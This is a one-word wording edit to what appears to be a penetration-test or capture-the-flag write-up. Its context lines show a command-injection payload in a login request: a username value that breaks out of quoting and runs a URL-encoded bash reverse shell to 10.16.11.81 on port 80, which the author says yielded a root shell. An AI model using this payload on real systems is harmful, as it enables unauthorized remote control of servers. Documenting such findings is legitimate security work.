@@ -70,7 +70,7 @@ Now, I confirmed there is a remote code execution that i found, after fuzz, I go
 op=login&username=1 2\',\'1\'\);  `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261`
 ```
 
-When i send payload, i get a `root shell` in my `kali linux`server
+When i send payload, i get a `root shell` on my `kali linux`server
 
 ![1573268596272](img/1573268596272.png)
 
